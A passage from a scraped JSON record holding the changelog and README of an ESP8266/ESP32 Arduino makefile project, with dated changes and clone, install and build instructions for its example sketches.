example)\n03/08/2016 :\nhandle subdirectories of core uniformly : pull request from surr. thank you\n02/29/2016\ncygwin support (from intrepidor not tested)\nupdate to esp8266-2.1.0\nuser can install specific libraries in libraries dir\n02/21/2016 :\nfix mkspiffs install\n02/18/2016 :\nnew x86 and x64 linux install\ncleanup\n08/12/2015 :\nadd install script for 32 bit linux\nupdate to esp8266-2.0.0-rc2\n04/11/2015 :\nuse zip file from official link (http://arduino.esp8266.com/staging/package_esp8266com_index.json)\nesp8266 git submodule removed\nremove $(arduino_core)/variants/$(variant) to include path (not needed)\n08/10/2015 :\nadd $(arduino_core)/variants/$(variant) to include path for nodemcuv2\n29/09/2015 :\nfix readme for third party tools installation\nmove post-installation out of the makefile\n23/09/2015 :\nworking dependencies\nmultiple ino files allowed\ncore & spiffs objects build in their own directories\nautodetect system and user libs used by the sketch\nmakefile renamed to esp8266arduino.mk\ninstallation and test\nclone this repository : git clone https://github.com/thunderace/esp8266-arduino-makefile.git\ninstall required tools :\nsudo apt-get update\nsudo apt-get install unzip sed\ncd esp8266-arduino-makefile\ninstall third party tools : for esp8266 chmod +x esp8266-install.sh && ./esp8266-install.sh for esp32 chmod +x esp32-install.sh && ./esp32-install.sh\nfor esp8266 :\ncd example/advancedwebserver\nmake\nfor esp32 :\ncd example/simplewifiserver\nmake\nupdate esp32 arduino core : cd esp32 && git pull\ngeneral usage\nin your sketch directory place a makefile that defines anything that is project specific and follow that with a line include /path_to_esp8266-arduino-makefile_directory/espxarduino.mk (see example)\nset the target :\narduino_arch=esp32 for esp32\nnothing or arduino_arch=esp8266 for esp8266\nmake upload should build your sketch and upload it...\n#dependencies\nfor esp8266, this project install the lastest stable esp8266/arduino repository (2.3.0)\nfor esp32, this project install the master of espressif/arduino-esp32\ntodo\nbuild user libs in their own directory to avoid problems with multiple files with same name.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7001013, "year": null}], "name": "toolarduino"}